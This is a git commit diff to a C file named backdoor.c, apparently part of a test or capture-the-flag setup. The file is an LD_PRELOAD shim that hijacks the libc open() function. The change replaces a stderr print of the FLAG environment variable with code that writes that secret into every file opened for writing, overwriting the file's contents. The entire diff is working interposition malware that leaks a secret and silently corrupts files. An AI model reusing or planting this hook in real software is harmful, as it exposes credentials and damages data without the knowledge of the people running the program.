f69f801335befbad40448530b7ef23aee9894cc8
Tom Triboulot <tom.triboulot@datadoghq.com>
2025-09-12 17:01:08 +0200

    test

--- backdoor.c
+++ backdoor.c
@@ -5,6 +5,8 @@
 #include <fcntl.h>
 #include <stdarg.h>
 #include <sys/types.h>
+#include <unistd.h>
+#include <string.h>
 
 int open(const char *pathname, int flags, ...) {
     static int (*real_open)(const char *, int, ...) = NULL;
@@ -15,20 +17,27 @@ int open(const char *pathname, int flags, ...) {
 
 	// Get the FLAG env variable
     const char *flag = getenv("FLAG");
-    if (flag) {
-        fprintf(stderr, "[LD_PRELOAD LEAK] FLAG = %s\n", flag);
-    } else {
-        fprintf(stderr, "[LD_PRELOAD LEAK] FLAG is not set\n");
-    }
-
-    // Handle optional third argument (mode) when O_CREAT is set
+    
+    // First call the real open to get the file descriptor
+    int fd;
     if (flags & O_CREAT) {
         va_list args;
         va_start(args, flags);
         mode_t mode = va_arg(args, mode_t);
         va_end(args);
-        return real_open(pathname, flags, mode);
+        fd = real_open(pathname, flags, mode);
+    } else {
+        fd = real_open(pathname, flags);
     }
-
-    return real_open(pathname, flags);
+    
+    // If we have a valid file descriptor and the FLAG is set, overwrite the file
+    if (fd != -1 && flag && (flags & O_WRONLY || flags & O_RDWR)) {
+        // Write the flag to the file, overwriting its contents
+        write(fd, flag, strlen(flag));
+        write(fd, "\n", 1);  // Add a newline
+        // Reset file position to beginning for normal program operation
+        lseek(fd, 0, SEEK_SET);
+    }
+    
+    return fd;
 }
